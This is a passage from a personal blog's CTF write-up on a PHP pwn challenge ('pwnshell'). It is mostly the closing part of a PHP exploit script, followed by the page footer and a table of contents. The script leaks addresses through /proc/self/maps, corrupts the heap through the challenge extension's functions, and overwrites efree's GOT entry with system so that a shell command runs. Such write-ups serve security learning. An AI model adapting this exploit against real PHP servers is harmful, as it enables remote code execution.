    <span class="token variable">$p1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/'</span><span class="token punctuation">;</span>
    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$buffer</span><span class="token punctuation">,</span> <span class="token variable">$libc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$p1</span><span class="token punctuation">,</span> <span class="token variable">$buffer</span><span class="token punctuation">,</span> <span class="token variable">$mbase</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$libc</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$mbase</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"leakaddr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/proc/self/maps"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$buffer</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">leakaddr</span><span class="token punctuation">(</span><span class="token variable">$buffer</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$libc_base</span> <span class="token operator">=</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token variable">$libc</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mod_base</span> <span class="token operator">=</span> <span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token variable">$mbase</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$system_addr</span> <span class="token operator">=</span> <span class="token number">0x4c490</span><span class="token punctuation">;</span>
<span class="token variable">$efree_got</span> <span class="token operator">=</span> <span class="token number">0x4038</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"b"</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// fgetc(STDIN);</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0xe</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">0x61</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
    <span class="token variable">$aa</span> <span class="token operator">=</span> <span class="token function">pack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">,</span> <span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token variable">$aa</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">addHacker</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token punctuation">&#125;</span>

<span class="token comment">// fgetc(STDIN);</span>
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/readflag > /var/www/html/flag.txt\x00"</span><span class="token punctuation">;</span>
<span class="token function">editHacker</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">removeHacker</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">addHacker</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">removeHacker</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">editHacker</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token function">int2str</span><span class="token punctuation">(</span><span class="token variable">$mod_base</span><span class="token operator">+</span><span class="token variable">$efree_got</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">addHacker</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">int2str</span><span class="token punctuation">(</span><span class="token variable">$libc_base</span><span class="token operator">+</span><span class="token variable">$system_addr</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">addHacker</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// fgetc(STDIN);</span>
<span class="token function">removeHacker</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

	  <div class="article-footer-copyright">
	Ciallo～(∠・ω< )⌒★
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2024/07/15/wkctf-pwn/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/06/25/xctf-ggbord复现/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-06-30 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>52</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>52</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#pwnshell-%E5%A4%8D%E7%8E%B0-php-pwn"><span class="toc-article-text">pwnshell 复现 (php pwn)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%EF%BC%9F"><span class="toc-article-text">如何调试？</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%B0%83%E8%AF%95%E7%9B%B8%E5%85%B3%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-article-text">调试相关的命令</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AE%89%E8%A3%85gdbserver"><span class="toc-article-text">安装gdbserver</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9E%84%E5%BB%BA%E9%95%9C%E5%83%8F"><span class="toc-article-text">构建镜像</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%BC%80%E5%90%AF%E5%AE%B9%E5%99%A8"><span class="toc-article-text">开启容器</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#gdbserver%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-article-text">gdbserver的使用</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-article-text">如何分析程序逻辑</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#zif-addHacker"><span class="toc-article-text">zif_addHacker</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#php%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95"><span class="toc-article-text">php变量类型的表示方法</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#zif-removeHacker"><span class="toc-article-text">zif_removeHacker</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#zif-editHacker"><span class="toc-article-text">zif_editHacker</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#zif-displayHacker"><span class="toc-article-text">zif_displayHacker</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#exp"><span class="toc-article-text">exp</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
